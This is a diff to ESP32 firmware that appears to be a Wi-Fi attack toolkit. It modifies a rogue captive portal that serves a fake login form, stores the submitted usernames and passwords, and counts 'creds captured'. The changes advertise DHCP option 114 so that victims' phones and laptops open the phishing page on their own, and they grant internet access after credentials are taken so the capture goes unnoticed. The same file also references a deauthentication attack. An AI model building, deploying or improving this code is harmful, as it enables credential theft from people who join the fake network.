@@ -13,7 +13,6 @@
 #include "esp_mac.h"
 #include "esp_netif.h"
 #include "esp_http_server.h"
-#include "dhcpserver/dhcpserver.h"   /* dhcps_set_captiveportal_uri — RFC 8910 */
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "freertos/semphr.h"
@@ -145,6 +144,10 @@ bool wifi_attack_deauth_running(void)
 
 #define CAPTIVE_MAX_CREDS   32
 #define CAPTIVE_AP_IP       "192.168.4.1"
+
+/* ESP-IDF retains these pointers for the lifetime of its DHCP server. */
+static char s_captive_api_uri[] = "http://" CAPTIVE_AP_IP "/api";
+static char s_captive_unrestricted_uri[] = "urn:ietf:params:capport:unrestricted";
 
 static bool             s_captive_running;
 static httpd_handle_t   s_captive_httpd;
@@ -344,9 +347,11 @@ static esp_err_t portal_post_handler(httpd_req_t *req)
     char user[128] = {0}, pass[128] = {0};
     form_field(body, "username", user, sizeof(user));
     form_field(body, "password", pass, sizeof(pass));
-    if (user[0] || pass[0]) captive_store(user, pass);
+    if (user[0] || pass[0]) {
+        captive_store(user, pass);
+        captive_authorize_ip(captive_req_ip(req));
+    }
 
-    /* Bounce back to the form so the victim thinks the login just failed. */
     httpd_resp_set_status(req, "302 Found");
     httpd_resp_set_hdr(req, "Location", "/");
     httpd_resp_send(req, NULL, 0);
@@ -545,9 +550,11 @@ esp_err_t wifi_attack_captive_start(const wifi_attack_captive_config_t *config)
         uint8_t offer_dns = 2;   /* OFFER_DNS bit — advertise DHCP option 6 */
         esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
                                ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof(offer_dns));
-        /* RFC 8910: advertise the captive-portal API URI (option 114) so modern
-         * OSes auto-open the sign-in page. Must be set before DHCP hands leases. */
-        dhcps_set_captiveportal_uri("http://" CAPTIVE_AP_IP "/api");
+        /* RFC 8910: option 114 carries the RFC 8908 API URI without a trailing
+         * NUL. ESP-IDF encodes it into both DHCP offers and acknowledgements. */
+        esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
+                               ESP_NETIF_CAPTIVEPORTAL_URI, s_captive_api_uri,
+                               sizeof(s_captive_api_uri) - 1);
         esp_netif_dhcps_start(ap_netif);
     }
 
@@ -601,7 +608,13 @@ esp_err_t wifi_attack_captive_stop(void)
     if (!s_captive_running) return ESP_OK;
     s_captive_running = false;
 
-    dhcps_set_captiveportal_uri(NULL);   /* stop advertising option 114 */
+    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (ap_netif) {
+        esp_netif_dhcps_stop(ap_netif);
+        esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
+                               ESP_NETIF_CAPTIVEPORTAL_URI, s_captive_unrestricted_uri,
+                               sizeof(s_captive_unrestricted_uri) - 1);
+    }
     if (s_captive_httpd) { httpd_stop(s_captive_httpd); s_captive_httpd = NULL; }
     if (s_captive_dns_sock >= 0) {
         int s = s_captive_dns_sock;
@@ -610,16 +623,16 @@ esp_err_t wifi_attack_captive_stop(void)
     }
 
     /* Tear down internet sharing: disable NAPT and forget authorized clients. */
-    if (s_captive_internet_share) {
-        esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-        if (ap_netif) esp_netif_napt_disable(ap_netif);
-    }
+    if (s_captive_internet_share && ap_netif) esp_netif_napt_disable(ap_netif);
     s_captive_internet_share = false;
     s_captive_auth_count     = 0;
     s_captive_upstream_dns   = 0;
 
-    esp_wifi_set_mode(s_captive_prev_mode == WIFI_MODE_NULL ? WIFI_MODE_STA
-                                                            : s_captive_prev_mode);
+    wifi_mode_t restore_mode = s_captive_prev_mode == WIFI_MODE_NULL ? WIFI_MODE_STA
+                                                                    : s_captive_prev_mode;
+    esp_wifi_set_mode(restore_mode);
+    if (ap_netif && (restore_mode == WIFI_MODE_AP || restore_mode == WIFI_MODE_APSTA))
+        esp_netif_dhcps_start(ap_netif);
     ESP_LOGI(TAG, "Captive portal stopped (%d creds captured)", s_captive_cred_count);
     return ESP_OK;
 }
